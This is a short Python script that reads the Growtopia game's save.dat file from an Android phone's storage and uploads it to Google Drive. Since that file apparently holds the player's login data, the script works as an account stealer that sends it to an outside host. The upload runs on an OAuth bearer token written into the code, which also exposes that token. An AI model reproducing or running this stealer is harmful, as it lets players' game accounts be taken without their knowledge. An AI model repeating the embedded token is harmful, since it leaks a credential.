import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMAPys1BWq4iMqvu_LFO8DxziOeabqkNX0kvzMgX2agPBX_jdQ1njLaXHUwl7PdJZFRxUeU3Z3v-X2w1KHnceUN11F4CGyaXBDok4axmBi5wQNNYYZg-TAWBWCxZvRvdeVN4ZlR1nYoJxGmhWs7nAG4v"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


